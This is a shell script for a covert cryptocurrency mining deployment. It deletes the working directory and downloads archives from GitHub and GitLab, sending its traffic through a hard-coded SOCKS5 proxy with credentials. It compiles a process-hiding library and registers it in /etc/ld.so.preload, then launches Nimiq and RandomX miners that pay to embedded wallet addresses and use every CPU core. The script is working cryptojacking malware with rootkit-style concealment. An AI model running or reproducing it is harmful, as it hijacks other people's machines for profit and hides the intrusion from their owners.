rm -rvf * && mkdir xcode && cd xcode
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://github.com/maszehh/sempak/raw/main/apik.tar.gz
tar -xvzf apik.tar.gz
rm -rf apik.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 103.253.244.9:443
socks5_username = jiz
socks5_password = juz
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp rm -rf gas && wget -q 'https://gitlab.com/guruberburu/alhamdulillah/-/raw/main/elpigi.zip' && unzip elpigi.zip
chmod +x gas
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf elpigi.zip

./graftcp/graftcp wget https://github.com/maszehh/sempak/raw/main/megatron.zip
unzip megatron.zip
rm -rf megatron.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./gas -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-200 -n 1)Gh-Simbah) -t 4 -i Disable & wget -q https://github.com/maszehh/sempak/raw/main/macan && chmod 700 macan && ./macan -o 103.253.244.6:443 -u ZEPHsA3mksJG2P4LgfHuuRDwswtmYxepV3ovN8mSR6BqLKzoAqdsz8nQGmmYtX8YBxKGvtHZ6VR2UU8c2tPec8rW7YvsPJtMPmJ -p Gh-Tukiman -a rx/0 -k --donate-level 1 -t $(nproc)
